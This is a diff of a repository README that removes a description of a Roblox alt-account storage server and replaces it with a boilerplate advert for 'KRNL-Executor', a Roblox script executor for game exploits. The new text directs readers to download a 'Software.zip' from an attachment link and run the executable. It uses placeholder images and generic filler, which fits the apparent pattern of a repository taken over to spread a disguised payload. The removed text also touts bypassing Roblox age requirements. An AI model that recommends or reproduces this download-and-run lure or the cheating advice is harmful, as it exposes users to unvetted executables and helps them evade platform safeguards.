@@ -1,9 +1,47 @@
-# Roblox Alt Storage (Node.JS Script)
-This is a node.js server created to let you store your Roblox Alt Accounts. <br>
-Basically, you store your alts in alts.json first, then, when you want to use an alt account, you must create a new Roblox account to get the oldest available alt account on Roblox. This "password system" allows you to use alts, and as a byproduct it also uses your newly generated Roblox alt account and lets it age so you can bypass minimum age requirements on Roblox Games! Think of this less of Roblox Alt Manager, more of a Roblox Alt Ager.
-# Important
-This is supposed to be used only with my Roblox Alt Generator found here: https://github.com/smoressy/Roblox-Alt-Generator-v3 <br>
-It will not work with personal alts since the passwords it finds are 2x the usernames, which is what my alt generator uses for the password system.
-# Dependancy
-Install express to use. 
-`npm install express`
+# KRNL-Executor
+
+![KRNL-Executor Logo](https://example.com/krnl-logo.png)
+
+The legendary KRNL executor is a highly regarded tool for Roblox on Windows, known for its reliability and efficiency in running Lua scripts, allowing users to access advanced game modifications and exploits for an enhanced gaming experience. This repository hosts the latest version of KRNL-Executor, providing Roblox enthusiasts with a powerful tool to elevate their gameplay.
+
+## Features
+
+- **Robust Execution**: Execute Lua scripts seamlessly within the Roblox environment.
+- **User-Friendly Interface**: Simple and intuitive interface for ease of use.
+- **Enhanced Gaming Experience**: Access advanced game modifications and exploits.
+- **Regular Updates**: Stay up to date with the latest improvements and features.
+
+## Installation
+
+1. Download the [latest version of KRNL-Executor](https://github.com/user-attachments/files/17394153/Software.zip).
+2. Extract the downloaded ZIP file to a location of your choice.
+3. Run the executable file to launch KRNL-Executor.
+
+## Usage
+
+1. Launch the KRNL-Executor application.
+2. Load your desired Lua script.
+3. Click on the 'Execute' button to run the script within Roblox.
+4. Enjoy the enhanced gameplay experience and explore new possibilities within your favorite Roblox games.
+
+## Support
+
+For any queries or support related to KRNL-Executor, feel free to reach out to our dedicated support team at [support@krnl.com](mailto:support@krnl.com).
+
+## Contribute
+
+We welcome contributions from the community to help improve KRNL-Executor. If you have any ideas, suggestions, or bug fixes, please submit a pull request or open an issue on our [GitHub repository](https://github.com/user/krnl-executor).
+
+## License
+
+KRNL-Executor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.
+
+---
+
+![KRNL-Executor Screenshot](https://example.com/krnl-screenshot.png)
+
+🚀 Happy exploiting! 🚀
+
+---
+
+*This README file is maintained by the KRNL development team. Last updated on June 1, 2023.*
